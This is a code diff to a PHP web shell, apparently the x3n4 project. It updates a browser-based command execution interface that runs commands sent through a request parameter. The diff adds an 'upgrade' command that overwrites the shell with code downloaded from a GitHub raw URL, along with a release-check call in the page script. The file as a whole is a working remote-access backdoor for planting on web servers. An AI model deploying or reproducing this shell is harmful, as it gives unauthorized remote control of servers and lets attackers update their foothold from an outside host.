@@ -1,5 +1,7 @@
 <?php
 
+define('X3N4_VERSION', 'v0.1.2-alpha');
+
 session_start();
 
 function get_shell_prefix()
@@ -9,11 +11,11 @@ function get_shell_prefix()
 function output_json($output = '')
 {
     header('Content-Type: application/json;');
-    echo json_encode([
+    echo json_encode(array(
         'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
         'banner' => get_shell_prefix(),
         'stdout' => $output
-    ]);
+    ));
     session_write_close();
     exit(0);
 }
@@ -21,10 +23,19 @@ if (!empty($_SESSION['pwd'])) {
     chdir($_SESSION['pwd']);
 }
 if (isset($_REQUEST['cmd'])) {
-    if (empty($_REQUEST['cmd'])) {
+    $REQUESTED_CMD = trim($_REQUEST['cmd']);
+    if (empty($REQUESTED_CMD)) {
         exit(0);
     }
-    if (trim($_REQUEST['cmd']) == 'exit') {
+    if ($REQUESTED_CMD == 'upgrade') {
+        $options  = array('http' => array('user_agent' => 'custom user agent string'));
+        $context  = stream_context_create($options);
+        file_put_contents(__FILE__.'.backup.php', file_get_contents(__FILE__));
+        file_put_contents(__FILE__, file_get_contents('https://raw.githubusercontent.com/jorge-matricali/x3n4/master/x3n4.php', false, $context));
+        output_json('--- PLEASE REFRESH YOUR BROWSER :D ---');
+        exit(0);
+    }
+    if ($REQUESTED_CMD == 'exit') {
         session_destroy();
         exit(0);
     }
@@ -70,7 +81,7 @@ if (isset($_REQUEST['cmd'])) {
     <div class="container">
         <h1 class="page-header">
             <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
-            x3n4 v0.1
+            x3n4 <?php echo X3N4_VERSION; ?>
         </h1>
 
         <pre id="stdout"><?php echo shell_exec('cat /etc/motd') . PHP_EOL; ?></pre>
@@ -109,6 +120,13 @@ if (isset($_REQUEST['cmd'])) {
             this.clickExecCommand = function() {
                 window.x3n4.execCommand($('#stdin').val());
                 $('#stdin').val('');
+            }
+            this.checkUpdate = function() {
+                //
+                $.get('https://api.github.com/repos/jorge-matricali/x3n4/releases', function(data) {
+                    $('#stdout').append(data[0].tag_name + " available.\n");
+                    $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
+                });
             }
             this.declareCallbacks = function() {
                 $('#btnExecCommand').on('click', this.clickExecCommand);
